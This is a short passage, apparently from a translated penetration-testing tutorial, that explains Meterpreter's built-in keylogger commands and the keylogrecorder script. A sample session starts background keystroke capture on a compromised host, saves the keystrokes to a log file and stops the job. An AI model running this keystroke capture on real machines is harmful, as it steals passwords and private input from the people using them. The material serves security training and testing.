@@ -1,0 +1,12 @@
+There are already two built-in keyloggers. One is just a set of commands: keyscan_start - starts the keylogger; keyscan_dump - displays the result; keyscan_stop - stops the keylogger.
+
+There is also a script called keylogrecorder. It is more efficient than keyscan, and moreover, it writes the result to a log:
+
+meterpreter > bgrun keylogrecorder
+[*] Executed Meterpreter with Job ID 2
+meterpreter > [*] Starting the keystroke sniffer...
+[*] Keystrokes being saved in to /root/.msf4/logs/scripts/keylogrecorder/192.168.ххх.ххх_20111024.4455.txt #адрес лога
+[*] Recording
+
+meterpreter > bgkill 2 #disable keylogger
+[*] Killing background job 2...
